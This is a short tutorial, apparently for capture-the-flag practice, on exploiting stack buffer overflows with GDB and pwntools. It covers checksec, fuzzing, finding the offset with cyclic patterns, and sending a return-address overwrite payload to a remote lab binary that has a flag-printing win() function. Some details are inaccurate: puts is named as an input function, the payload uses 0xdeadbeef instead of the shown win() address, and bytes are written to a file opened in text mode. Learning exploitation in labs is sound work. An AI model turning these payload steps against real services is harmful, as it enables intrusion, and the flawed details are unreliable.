# Buffer Overflow Exploitation
This section will go into detail about how to exploit buffer overflows, which is often seen where the program uses `gets`, `puts` or `scanf` functions. These functions are often used to read user input, and are often vulnerable to buffer overflows as they do not check the length of the input.

## Setup
**Debugger/Disassembler:**
* [GDB](https://www.gnu.org/software/gdb/)
* [Ghidra](https://ghidra-sre.org/)

**Programming Languages:**
* [Python](https://www.python.org/)

**Python Libraries:**
* [pwntools](https://docs.pwntools.com/en/stable/)

**Extensions:**
* [Pwndbg - GDB Extension](https://github.com/pwndbg/pwndbg#readme). 

## 01 - Checksec
See this page for more information on checksec: [Checksec](../../Checksec/Readme.md).

Start by running checksec on the vulnerable binary:
```bash
$ checksec --file=vuln
```

## 02 - Fuzzing
Fuzzing is a technique used to find the offset of the buffer overflow. It involves sending a large amount of data to the program, and seeing if it crashes. If it does, then you know that you have found the offset of the buffer overflow.

```bash
$ python -c "print ('A' * 100)" | ./<executable> # Local
$ python -c "print ('A' * 100)" | nc <ip> <port> # Remote

# Alternative
$ nc <ip> <port> <<<  $(python -c 'print("A" * 100)') # Remote
```

## 03 - Finding the Offset
Once you have found the offset of the buffer overflow, you can use this to find the offset of the return address. This is done by sending a large amount of data to the program, and then sending the address of the return address. If the program crashes, then you know that you have found the offset of the return address.

Create a file called `pattern.py`:
```python
from pwn import *

# Create the pattern
pattern = cyclic(100)
print(pattern)

# Save the pattern to a file
with open('pattern.txt', 'w') as f:
    f.write(pattern)
```

Run the script:
```bash
$ gdb ./<executable>
(gdb) r < pattern.txt
```

## 03 - Creating the Payload
Look at the EIP register, lets just say it has the value `0x6161616c` and cyclic value of `laaa`.

Get the function call address for a function. An example could be win() printing out a flag:
```bash
(gdb) info functions
All defined functions:

Non-debugging symbols:
...
0x080491f6  win
0x08049281  vuln
0x080492c4  main
...
```

Now we can create a payload that will overwrite the return address with the address of the function call:
```python
from pwn import *

# Create the pattern
padding = cyclic(cyclic_find('laaa'))

# Filling the EIP with a function call address
eip = p32(0xdeadbeef)

# Creating the payload
payload = padding + eip
print(payload)
```

## 04 - Sending the Payload
Time to send the payload to the program:
```python
# Sending the payload to the program
r = remote('host', <port>)
r.recvuntil(b"Welcome. Can you guess my number?\n") # Wait for the prompt
r.sendline(payload)
r.interactive()
```
